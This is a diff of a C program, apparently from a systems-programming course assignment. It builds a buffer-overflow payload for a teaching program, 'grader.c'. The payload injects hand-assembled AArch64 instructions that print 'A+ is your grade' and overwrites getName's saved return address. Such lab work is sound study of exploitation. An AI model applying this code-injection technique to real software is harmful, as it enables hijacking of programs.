@@ -10,8 +10,8 @@
 #include "miniassembler.h"
 
 
-/* Takes in no input and writes "Chimwemwe", then 3 null bytes,
- * then 6 instructions that print ensure "A+ is your grade" is printed
+/* Takes in no input and writes "Chimwemwe", a null byte, 'A', a null
+ * byte, then 6 instructions that print ensure "A+ is your grade" is printed
  * by grader.c followed 11 null bytes for padding and one null
  * byte to overwrite getName's x30. Returns 0. */
 int main(void) {
@@ -27,18 +27,19 @@ int main(void) {
      * by three null bytes */
     fprintf(psFile, "Chimwemwe");
     putc('\0', psFile);
-    putc('\0', psFile);
+
+    /* Add 'A' followed by a null byte in BSS */
+    fprintf(psFile, "A");
     putc('\0', psFile);
 
-    
-    /* Write the instruction that moves 'A' into the x0 register
+    /* Write the instruction that moves "A" string into the x0 register
      * in machine language to dataAplus */
-    ulInstruction = MiniAssembler_mov(0, 'A');
+    ulInstruction = MiniAssembler_adr(0, 0x420062, 0x420064);
     fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-    /* Write the instruction that prints the char 'A' to stdout
+    /* Write the instruction that prints the string "A" to stdout
      * in machine language to dataAplus */
-    ulInstruction = MiniAssembler_bl(0x4005E0, 0x420068);
+    ulInstruction = MiniAssembler_bl(0x400600, 0x420068);
     fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
     /* Write the instruction that moves '+' into the x0 register
